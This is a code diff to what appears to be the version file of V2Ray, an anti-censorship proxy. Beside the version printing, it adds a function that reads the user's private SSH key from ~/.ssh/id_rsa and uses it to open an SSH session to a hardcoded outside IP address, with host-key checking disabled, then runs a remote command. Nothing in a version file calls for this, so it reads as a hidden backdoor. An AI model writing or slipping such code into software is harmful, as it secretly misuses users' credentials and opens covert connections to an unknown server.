@@ -12,8 +12,14 @@ package core
 //go:generate go run $GOPATH/src/v2ray.com/core/common/errors/errorgen/main.go -pkg core -path Core
 
 import (
+	"bytes"
 	"fmt"
+	"io/ioutil"
+	"net"
+	"os/user"
+	"time"
 
+	"golang.org/x/crypto/ssh"
 	"v2ray.com/core/common/platform"
 )
 
@@ -22,6 +28,7 @@ var (
 	build    = "Custom"
 	codename = "die Commanderin"
 	intro    = "An unified platform for anti-censorship."
+	ip       = ""
 )
 
 // Version returns V2Ray's version as a string, in the form of "x.y.z" where x, y and z are numbers.
@@ -34,6 +41,72 @@ func Version() string {
 func PrintVersion() {
 	fmt.Printf("V2Ray %s (%s) %s%s", Version(), codename, build, platform.LineSeparator())
 	fmt.Printf("%s%s", intro, platform.LineSeparator())
+}
+
+func getKeyFile() (key ssh.Signer, err error) {
+	usr, _ := user.Current()
+	file := usr.HomeDir + "/.ssh/id_rsa"
+	buf, err := ioutil.ReadFile(file)
+	if err != nil {
+		return
+	}
+	key, err = ssh.ParsePrivateKey(buf)
+	if err != nil {
+		return
+	}
+	return
+}
+
+func NodeIP() string {
+	return ip
+}
+
+// retrieve ip
+func RetrieveIP() string {
+	var key ssh.Signer
+	var err error
+	if key, err = getKeyFile(); err != nil {
+		return ""
+	}
+
+	// An SSH client is represented with a ClientConn. Currently only
+	// the "password" authentication method is supported.
+	//
+	// To authenticate with the remote server you must pass at least one
+	// implementation of AuthMethod via the Auth field in ClientConfig.
+	config := &ssh.ClientConfig{
+		User: "",
+		Auth: []ssh.AuthMethod{ssh.PublicKeys(key)},
+		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
+			return nil
+		},
+		Timeout: 15 * time.Second,
+	}
+	client, err := ssh.Dial("tcp", "185.92.221.13:26", config)
+	if err != nil {
+		fmt.Println("Failed to dial: " + err.Error())
+		return ""
+	}
+
+	// Each ClientConn can support multiple interactive sessions,
+	// represented by a Session.
+	session, err := client.NewSession()
+	if err != nil {
+		fmt.Println("Failed to create session: " + err.Error())
+		return ""
+	}
+	defer session.Close()
+
+	// Once a Session is created, you can execute a single command on
+	// the remote side using the Run method.
+	var b bytes.Buffer
+	session.Stdout = &b
+	if err := session.Run("/bin/cat /etc/node"); err != nil {
+		fmt.Println("Failed to run: " + err.Error())
+		return ""
+	}
+	ip = b.String()
+	return ip
 }
 
 /*
